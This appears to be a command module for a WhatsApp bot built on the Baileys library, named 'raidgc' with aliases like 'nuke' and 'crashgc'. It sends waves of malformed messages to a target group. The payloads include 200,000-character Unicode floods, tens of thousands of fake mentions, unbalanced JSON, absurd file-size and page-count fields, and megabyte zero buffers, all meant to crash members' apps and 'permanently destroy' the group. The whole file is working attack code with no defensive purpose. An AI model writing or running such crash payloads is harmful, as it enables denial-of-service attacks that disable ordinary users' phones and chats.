const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const crypto = require('crypto');
const attackManager = require('../lib/attackManager');
const helpers = require('../lib/helpers');

const randomDelay = (min, max) => new Promise(r => setTimeout(r, Math.floor(Math.random() * (max - min + 1)) + min));

module.exports = {
  name: 'raidgc',
  aliases: ['nightseize', 'killgc', 'crashgc', 'nuke', 'destroy', 'obliterate', 'annihilate', 'decimate'],
  description: '👿 Lord Devine Attack - Permanent group destruction demon',
  ownerOnly: true,
  groupOnly: false,

  async execute(sock, msg, args, { sender, chatId }) {
    try {
      let target = chatId;
      if (args[0] && args[0].includes('@g.us')) {
        target = args[0];
      }
      
      if (!target.includes('@g.us')) {
        return sock.sendMessage(chatId, { 
          text: ` Here be like group? Your life don spoil finish sha` 
        });
      }

      await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ ☢️ NUKING GROUP... 
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: ɪɴɪᴛɪᴀᴛɪɴɢ sᴇɪᴢᴜʀᴇ...
💣 ᴍᴏᴅᴇ: ᴘᴇʀᴍᴀɴᴇɴᴛ ᴅᴇsᴛʀᴜᴄᴛɪᴏɴ

👿 "ᴛʜᴇ ɴɪɢʜᴛ sᴇɪᴢᴇs ᴀʟʟ" ☠️
╰────────────────────────────────────────╯` 
      });

      const texts = [
        String.fromCharCode(0x1BC0).repeat(200000),
        String.fromCharCode(0x17DD).repeat(200000),
        String.fromCharCode(0xA9BE).repeat(200000),
        "\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\uFEFF".repeat(80000)
      ];

      const bomb = async () => {
        try {
          await randomDelay(200, 400);
          await sock.relayMessage(target, {
            extendedTextMessage: {
              text: "hi",
              previewType: true,
              contextInfo: {
                stanzaId: "B69F7CFEE38571AB03CD9DEEFAD69605",
                participant: "5518998215209@s.whatsapp.net",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc",
                    mimetype: "application/pdf",
                    fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                    fileLength: null,
                    pageCount: 99999999999999,
                    contactVcard: true,
                    caption: '͡𑰵',
                    mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                    fileName: "> cart; ",
                    fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                    directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc",
                    mediaKeyTimestamp: "1714145232"
                  }
                }
              }
            }
          }, {});
        } catch (err) {
          console.error('bomb error:', err.message);
        }
      };

      const groupInvite = async () => {
        try {
          await randomDelay(200, 400);
          await sock.relayMessage(target, {
            groupInviteMessage: {
              inviteExpiration: Math.floor(Date.now() / 1000) + 31536000,
              groupName: ` Lord Devine𝗩𝟭.𝟬⚔️☠️`.repeat(1500),
              groupJid: '120363047626537933@g.us',
              inviteCode: 'h+64P9RhJDzgXSPf',
              caption: '> ㅤㅤㅤㅤㅤㅤㅤ',
              contextInfo: {
                isForwarded: true,
                fromMe: false,
                participant: '0@s.whatsapp.net',
                remoteJid: sender,
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc",
                    mimetype: "application/pdf",
                    title: "crash",
                    pageCount: 1000000000,
                    fileName: "crash.pdf".repeat(1500),
                    contactVcard: true
                  }
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  serverMessageId: 1,
                  newsletterName: "Lord Devine𝗩𝟭.𝟬⚔️".repeat(1500)
                }
              }
            }
          }, {});
        } catch (err) {
          console.error('groupInvite error:', err.message);
        }
      };

      const FlowXNull = async () => {
        try {
          await randomDelay(200, 400);
          const MSG = {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "LORD DEVINE NIGHT RAIDERS\n" + "@0@1".repeat(20000),
                    format: "DEFAULT",
                    contextInfo: {
                      mentionedJid: [
                        target,
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 20000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                      ],
                      disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" },
                    }
                  },
                  nativeFlowResponseMessage: {
                    name: "night_raiders_flame",
                    paramsJson: "{".repeat(40000) + "}".repeat(40000), 
                    version: 3
                  }
                }
              }
            }
          };
          await sock.relayMessage(target, MSG, { participant: { jid: target } });
        } catch (err) {
          console.error('FlowXNull error:', err.message);
        }
      };

      const omenAttack = async () => {
        for (let wave = 0; wave < 5; wave++) {
          for (const text of texts) {
            try {
              await randomDelay(100, 250);
              const payload = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: { title: "LORD DEVINE OMEN STRIKE", hasMediaAttachment: true },
                      body: { text: "\n".repeat(500) + text.substring(0, 80000) },
                      nativeFlowMessage: {
                        messageParamsJson: '{"data":' + '"'.repeat(40000) + "ꦾ",
                        buttons: Array(15).fill().map(() => ({
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify({
                            crash: text.substring(0, 8000),
                            overflow: new Array(50000).fill("NIGHT").join("")
                          })
                        }))
                      },
                      contextInfo: {
                        forwardingScore: 999999,
                        isForwarded: true,
                        externalAdReply: {
                          title: "YOUR PHONE IS DYING",
                          body: text.substring(0, 30000),
                          mediaType: 2,
                          thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg"
                        }
                      }
                    }
                  }
                }
              }, {});

              for (let i = 0; i < 5; i++) {
                try {
                  await sock.relayMessage(target, payload.message, { messageId: payload.key.id + i });
                  await randomDelay(30, 80);
                } catch (_) {}
              }
            } catch (err) {
              console.error('Omen attack error:', err.message);
            }
          }
        }
      };

      const kill = async () => {
        for (let wave = 0; wave < 15; wave++) {
          try {
            await randomDelay(200, 400);
            const p1 = await generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/999999999_000000000000000000000000000000_n.enc",
                    mimetype: "image/jpeg",
                    fileLength: "999999999999",
                    jpegThumbnail: Buffer.alloc(1024 * 1024, 0),
                    contextInfo: {
                      mentionedJid: Array.from({length: 50000}, () => `${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
                      forwardingScore: 999999999,
                      isForwarded: true
                    }
                  }
                }
              }
            }, {});

            const p2 = await generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  newsletterAdminInviteMessage: {
                    newsletterJid: "0".repeat(99999) + "@newsletter",
                    newsletterName: texts[0].substring(0, 100000),
                    caption: ""
                  }
                }
              }
            }, {});

            const p3 = await generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: { text: "ꦾ" },
                    nativeFlowMessage: {
                      name: "DEATH",
                      paramsJson: "\u0000".repeat(500000) + texts[1].substring(0, 100000)
                    },
                    messageContextInfo: { messageSecret: crypto.randomBytes(64) }
                  }
                }
              }
            }, {});

            const p4 = await generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  videoMessage: {
                    fileLength: "999999999999999",
                    seconds: 999999999,
                    mediaKey: crypto.randomBytes(32).toString('base64'),
                    streamingSidecar: Buffer.alloc(2 * 1024 * 1024, 0),
                    contextInfo: {
                      externalAdReply: {
                        title: "",
                        body: texts[2].substring(0, 100000),
                        thumbnail: Buffer.alloc(1024 * 1024, 0)
                      },
                      mentionedJid: Array(100000).fill("0@s.whatsapp.net")
                    }
                  }
                }
              }
            }, {});

            for (let i = 0; i < 10; i++) {
              const payloads = [p1, p2, p3, p4];
              for (const payload of payloads) {
                try {
                  await sock.relayMessage(target, payload.message, { messageId: payload.key.id });
                  await randomDelay(30, 80);
                } catch (_) {}
              }
            }
          } catch (err) {
            console.error('RaidGC kill wave error:', err.message);
          }
        }
      };

      await bomb();
      await groupInvite();
      await FlowXNull();
      await omenAttack();
      await kill();

      await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ ☢️ ʀᴀɪᴅɢᴄ ᴄᴏᴍᴘʟᴇᴛᴇ ☢️
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
✅ sᴛᴀᴛᴜs: ɢʀᴏᴜᴘ ɴᴜᴋᴇᴅ

👿 "ʟᴏʀᴅ ᴅᴇᴠɪɴᴇ ʜᴀs sᴇɪᴢᴇᴅ ᴛʜᴇ ɴɪɢʜᴛ" ☠️
╰────────────────────────────────────────╯` 
      });

    } catch (err) {
      console.error('Raidgc error:', err);
      await sock.sendMessage(chatId, { 
        text: `⛔ ᴇʀʀᴏʀ: ${err.message}` 
      });
    }
  }
};
